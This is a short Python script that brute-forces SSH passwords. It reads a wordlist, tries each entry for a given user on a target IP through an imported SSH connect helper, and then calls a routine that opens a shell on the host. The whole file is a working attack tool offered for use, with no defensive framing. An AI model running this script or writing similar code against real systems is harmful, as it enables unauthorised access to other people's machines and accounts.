#!/usr/bin/python3

from pexpect import pxssh
import argparse
import time

from ssh_connect import *

# passwd brute forcing
def main_p():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip", help="Specify Target ip")
	parser.add_argument("user", help="Specify Target User")
	parser.add_argument("file", help="Specify wordlist file")

	args = parser.parse_args()

	if args.ip and args.user and args.file:

		with open(args.file, 'r') as lines:

				startTime = time.time()
				
				for line in lines: # reading a line from lines in file
					passwd = line.strip("\r\n")

					print(color_obj.WHITE+"[*] Testing: ", args.user+":"+str(passwd)+color_obj.ENDC)

					conn = connect(args.ip, args.user, passwd) # ssh connect

					# Getting shell after connecting to ssh 
					shell_getting(args.user, args.ip, conn, startTime)

	else:
		print(parser.usage)
		exit(0)



if __name__ == '__main__': 

	main_p()
